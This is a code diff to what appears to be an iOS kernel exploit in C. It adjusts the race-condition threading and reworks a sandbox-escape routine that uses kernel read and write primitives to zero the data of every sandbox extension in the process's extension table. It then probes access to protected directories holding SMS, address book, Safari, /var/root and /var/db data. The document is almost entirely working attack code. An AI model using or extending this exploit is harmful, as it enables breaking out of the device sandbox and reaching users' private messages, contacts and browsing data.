@@ -273,7 +273,8 @@ void *free_thread_func(void *arg)
 	while (goSync == 0);
 
 	while (goSync != 0) {
-		while (raceSync == 0);
+		while (raceSync == 0 && goSync != 0);
+		if (goSync == 0) break;
 
 		kern_return_t kr = mach_vm_map(mach_task_self(),
 									   &freeTarget,
@@ -880,6 +881,7 @@ uint64_t kernel_slide;
 
 int main(int argc, char* argv[])
 {
+	setvbuf(stdout, NULL, _IONBF, 0);
 	init_globals();
 	struct utsname name;
 	uname(&name);
@@ -911,7 +913,6 @@ int main(int argc, char* argv[])
 	printf("[+] successReadCount: %d\n", successReadCount);
 
 	goSync = 0;
-	raceSync = 1;
 	pthread_join(freeThread, NULL);
 	close(writeFd);
 	close(readFd);
@@ -932,7 +933,7 @@ int main(int argc, char* argv[])
 	if (!sandbox) {
 		printf("[+] no sandbox — already unsandboxed\n"); fflush(stdout);
 	} else {
-		// first, issue+consume an extension so there's one in the table
+		// issue+consume an extension so there's one in the table
 		char *tmppath = calloc(1, 1024);
 		confstr(_CS_DARWIN_USER_TEMP_DIR, tmppath, 1024);
 		char tmpname[64];
@@ -951,33 +952,31 @@ int main(int argc, char* argv[])
 		uint64_t ext_set = early_kread64(sandbox + OFFSET_SANDBOX_EXTSET);
 		printf("[i] ext_set=%#llx\n", ext_set); fflush(stdout);
 
-		// ext_set is a hash table: ext_table[hash] -> extension_hdr linked list
-		// hash=0 for read-write extensions
-		uint64_t ext_hdr = early_kread64(ext_set + 0 * 8);
-		printf("[i] ext_hdr=%#llx\n", ext_hdr); fflush(stdout);
+		// ext_set is a hash table with multiple buckets for different extension types
+		// walk all buckets and zero every extension's data to make them wildcard
+		int escaped = 0;
+		for (int bucket = 0; bucket < 16; bucket++) {
+			uint64_t ext_hdr = early_kread64(ext_set + bucket * 8);
+			if (!ext_hdr) continue;
 
-		// walk to last ext_hdr in chain
-		while (ext_hdr) {
-			uint64_t next = early_kread64(ext_hdr + 0x00);
-			if (!next) break;
-			ext_hdr = next;
-		}
-
-		// ext_hdr + 0x8 -> ext_lst -> extension
-		uint64_t ext = early_kread64(ext_hdr + 0x08);
-		printf("[i] ext=%#llx\n", ext); fflush(stdout);
-
-		if (ext) {
-			uint64_t data = early_kread64(ext + OFFSET_EXT_DATA);
-			uint64_t data_len = early_kread64(ext + OFFSET_EXT_DATA_LEN);
-			printf("[i] data=%#llx data_len=%llu\n", data, (unsigned long long)data_len); fflush(stdout);
-
-			if (data && data_len) {
-				// zero data[0] and data_length to make extension match everything
-				early_kwrite64(ext + OFFSET_EXT_DATA, 0);
-				early_kwrite64(ext + OFFSET_EXT_DATA_LEN, 0);
-				printf("[+] SANDBOX ESCAPED - zeroed extension data\n"); fflush(stdout);
+			while (ext_hdr) {
+				uint64_t ext = early_kread64(ext_hdr + 0x08);
+				if (ext) {
+					uint64_t data = early_kread64(ext + OFFSET_EXT_DATA);
+					uint64_t data_len = early_kread64(ext + OFFSET_EXT_DATA_LEN);
+					if (data && data_len) {
+						early_kwrite64(ext + OFFSET_EXT_DATA, 0);
+						early_kwrite64(ext + OFFSET_EXT_DATA_LEN, 0);
+						printf("[+] zeroed extension in bucket %d (data=%#llx len=%llu)\n",
+							bucket, data, (unsigned long long)data_len); fflush(stdout);
+						escaped++;
+					}
+				}
+				ext_hdr = early_kread64(ext_hdr + 0x00);
 			}
+		}
+		if (escaped) {
+			printf("[+] SANDBOX ESCAPED - zeroed %d extensions\n", escaped); fflush(stdout);
 		}
 	}
 
@@ -986,6 +985,8 @@ int main(int argc, char* argv[])
 		"/var/mobile/Library/SMS",
 		"/var/mobile/Library/AddressBook",
 		"/var/mobile/Library/Safari",
+		"/var/root",
+		"/var/db",
 		NULL
 	};
 	for (int d = 0; test_dirs[d]; d++) {
